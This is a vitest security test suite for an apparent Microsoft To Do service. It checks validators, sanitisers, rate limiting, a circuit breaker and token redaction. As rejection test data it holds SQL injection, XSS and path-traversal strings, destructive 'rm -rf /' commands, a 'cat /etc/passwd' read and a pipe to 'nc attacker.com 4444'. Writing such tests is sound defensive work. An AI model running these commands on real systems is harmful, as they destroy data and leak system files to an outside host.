/**
 * Comprehensive security test suite.
 * Tests all security controls and validates no sensitive data exposure.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { logger } from '../../src/security/logger.js';
import { sanitizeError, sanitizeTasks } from '../../src/security/sanitizers.js';
import {
  validateODataFilter,
  validateListId,
  validateSearchQuery,
} from '../../src/security/validators.js';
import { ValidationError, RateLimitError, AuthenticationError } from '../../src/security/errors.js';
import { RateLimiter } from '../../src/graph/rate-limiter.js';
import { CircuitBreaker } from '../../src/graph/circuit-breaker.js';
import { ToDoTask } from '../../src/graph/todo-service.js';

describe('Security Test Suite', () => {
  // Note: Logger redaction is tested in logger.test.ts

  describe('Input Validation Security', () => {
    it('should prevent SQL injection in OData filters', () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",  // Semicolon should be caught
        "status eq 'x'; DELETE FROM tasks",  // Semicolon + DELETE keyword
        "status eq '<script>DROP</script>'",  // Angle brackets caught
      ];

      sqlInjectionAttempts.forEach((attempt) => {
        expect(() => validateODataFilter(attempt)).toThrow(ValidationError);
      });
    });

    it('should prevent XSS in OData filters', () => {
      const xssAttempts = [
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "' onerror='alert(1)",
      ];

      xssAttempts.forEach((attempt) => {
        expect(() => validateODataFilter(attempt)).toThrow(ValidationError);
      });
    });

    it('should prevent path traversal in list IDs', () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        'list/../../secrets',
      ];

      pathTraversalAttempts.forEach((attempt) => {
        expect(() => validateListId(attempt)).toThrow(ValidationError);
      });
    });

    it('should prevent command injection in search queries', () => {
      const commandInjectionAttempts = [
        'search; rm -rf /',
        'search && cat /etc/passwd',
        'search | nc attacker.com 4444',
      ];

      commandInjectionAttempts.forEach((attempt) => {
        expect(() => validateSearchQuery(attempt)).toThrow(ValidationError);
      });
    });

    it('should enforce maximum length limits', () => {
      // Search query too long
      const longQuery = 'a'.repeat(1001);
      expect(() => validateSearchQuery(longQuery)).toThrow(ValidationError);

      // List ID too long
      const longId = 'a'.repeat(201);
      expect(() => validateListId(longId)).toThrow(ValidationError);
    });

    it('should reject null bytes', () => {
      expect(() => validateListId('list\x00injection')).toThrow(ValidationError);
      expect(() => validateSearchQuery('search\x00injection')).toThrow(ValidationError);
    });
  });

  describe('Output Sanitization Security', () => {
    it('should never expose Microsoft Graph internal fields', () => {
      const taskWithInternals: ToDoTask = {
        id: 'task-123',
        title: 'Test Task',
        status: 'notStarted',
        importance: 'high',
        createdDateTime: '2025-01-01T00:00:00Z',
        lastModifiedDateTime: '2025-01-02T00:00:00Z',
        isReminderOn: false,
        // These should be sanitized/transformed
        dueDateTime: {
          dateTime: '2025-01-10T00:00:00Z',
          timeZone: 'UTC',
        },
        reminderDateTime: {
          dateTime: '2025-01-09T00:00:00Z',
          timeZone: 'UTC',
        },
      };

      const sanitized = sanitizeTasks([taskWithInternals])[0];

      // Should extract dateTime string
      expect(sanitized.dueDateTime).toBe('2025-01-10T00:00:00Z');

      // Should not have nested objects
      expect(typeof sanitized.dueDateTime).toBe('string');

      // Should not expose timezone separately
      expect(sanitized).not.toHaveProperty('timeZone');
    });

    it('should sanitize errors without exposing stack traces', () => {
      const error = new Error('Service error');
      error.stack = 'Error: Service error\n    at Object.<anonymous> (/internal/path/db.ts:123:5)';

      const sanitized = sanitizeError(error);

      // Should have error message
      expect(sanitized).toHaveProperty('error');

      // Should NOT expose stack trace
      expect(sanitized).not.toHaveProperty('stack');
      expect(JSON.stringify(sanitized)).not.toContain('/internal/path');
      expect(JSON.stringify(sanitized)).not.toContain('db.ts:123');
    });

    it('should sanitize authentication errors safely', () => {
      const error = new AuthenticationError('Authentication required');

      const sanitized = sanitizeError(error);

      // Should have safe error message
      expect(sanitized.error).toBe('Authentication required');
      expect(sanitized.code).toBe('AuthenticationError');

      // Should not expose stack
      expect(sanitized).not.toHaveProperty('stack');
    });
  });

  describe('Error Handling Security', () => {
    it('should return generic error messages', () => {
      const errors = [
        new Error('Internal database error at line 123'),
        new Error('Redis connection to 10.0.0.5:6379 failed'),
        new Error('AWS S3 access denied for bucket internal-secrets'),
      ];

      errors.forEach((error) => {
        const sanitized = sanitizeError(error);

        // Should have error field
        expect(sanitized).toHaveProperty('error');

        // Generic errors should not expose details
        if (error.name === 'Error') {
          expect(sanitized.code).toBeUndefined();
        }
      });
    });

    it('should include safe error codes', () => {
      const validationError = new ValidationError('Invalid input');
      const rateLimitError = new RateLimitError('Too many requests', 5000);

      const sanitizedValidation = sanitizeError(validationError);
      const sanitizedRateLimit = sanitizeError(rateLimitError);

      // Should include error type as code
      expect(sanitizedValidation.code).toBe('ValidationError');
      expect(sanitizedRateLimit.code).toBe('RateLimitError');

      // But not internal details
      expect(JSON.stringify(sanitizedValidation)).not.toContain('stack');
      expect(JSON.stringify(sanitizedRateLimit)).not.toContain('retryAfterMs');
    });
  });

  describe('Rate Limiting Security', () => {
    beforeEach(() => {
      vi.useFakeTimers();
    });

    afterEach(() => {
      vi.useRealTimers();
    });

    it('should prevent rate limit bypass attempts', async () => {
      const limiter = new RateLimiter({
        maxRequestsPerMinute: 5,
        burstAllowance: 5,
      });

      // Use up all tokens
      for (let i = 0; i < 5; i++) {
        await limiter.checkLimit();
      }

      // Try to bypass by making rapid requests
      const bypassAttempts = [];
      for (let i = 0; i < 10; i++) {
        bypassAttempts.push(
          limiter.checkLimit().catch((e) => e)
        );
      }

      const results = await Promise.all(bypassAttempts);

      // All should fail with RateLimitError
      results.forEach((result) => {
        expect(result).toBeInstanceOf(RateLimitError);
      });
    });

    it('should not allow negative token manipulation', async () => {
      const limiter = new RateLimiter({
        maxRequestsPerMinute: 10,
      });

      // Try to consume more tokens than available
      for (let i = 0; i < 10; i++) {
        await limiter.checkLimit();
      }

      // Should fail
      await expect(limiter.checkLimit()).rejects.toThrow(RateLimitError);

      // Tokens should not go negative
      expect(limiter.getAvailableTokens()).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Circuit Breaker Security', () => {
    beforeEach(() => {
      vi.useFakeTimers();
    });

    afterEach(() => {
      vi.useRealTimers();
    });

    it('should prevent resource exhaustion attacks', async () => {
      const breaker = new CircuitBreaker({
        failureThreshold: 3,
        successThreshold: 2,
        timeout: 5000,
      });

      // Simulate sustained attack
      for (let i = 0; i < 3; i++) {
        try {
          await breaker.execute(async () => {
            throw new Error('Service unavailable');
          });
        } catch {
          // Expected
        }
      }

      // Circuit should be open
      expect(breaker.getState()).toBe('OPEN');

      // Further requests should fail fast without hitting backend
      const failFastStart = Date.now();
      try {
        await breaker.execute(async () => 'should not execute');
      } catch {
        // Expected
      }
      const failFastDuration = Date.now() - failFastStart;

      // Should fail immediately (< 10ms)
      expect(failFastDuration).toBeLessThan(10);
    });
  });

  describe('Authentication Security', () => {
    it('should never log authentication tokens', () => {
      const mockLog = vi.fn();
      const originalLog = console.log;
      console.log = mockLog;

      // Simulate logging scenario
      logger.info('Authentication successful', {
        userId: '123',
        access_token: 'secret_token',
        refresh_token: 'secret_refresh',
      });

      console.log = originalLog;

      const allLogs = mockLog.mock.calls.map((call) => JSON.stringify(call)).join('');

      // Tokens should be redacted
      expect(allLogs).not.toContain('secret_token');
      expect(allLogs).not.toContain('secret_refresh');
    });
  });

  describe('CSRF Protection', () => {
    it('should validate OData filters are not executable code', () => {
      const codeExecutionAttempts = [
        "eval('malicious code')",
        "process.exit(1)",
        "require('child_process').exec('rm -rf /')",
      ];

      codeExecutionAttempts.forEach((attempt) => {
        expect(() => validateODataFilter(attempt)).toThrow(ValidationError);
      });
    });
  });

  describe('Data Integrity', () => {
    it('should validate all required fields are present', () => {
      const tasks: ToDoTask[] = [
        {
          id: 'task-1',
          title: 'Valid Task',
          status: 'notStarted',
          importance: 'high',
          createdDateTime: '2025-01-01T00:00:00Z',
          lastModifiedDateTime: '2025-01-02T00:00:00Z',
          isReminderOn: false,
        },
      ];

      const sanitized = sanitizeTasks(tasks);

      // All required fields should be present
      expect(sanitized[0]).toHaveProperty('id');
      expect(sanitized[0]).toHaveProperty('title');
      expect(sanitized[0]).toHaveProperty('status');
      expect(sanitized[0]).toHaveProperty('importance');
      expect(sanitized[0]).toHaveProperty('createdDateTime');
      expect(sanitized[0]).toHaveProperty('lastModifiedDateTime');
      expect(sanitized[0]).toHaveProperty('isReminderOn');
    });
  });
});
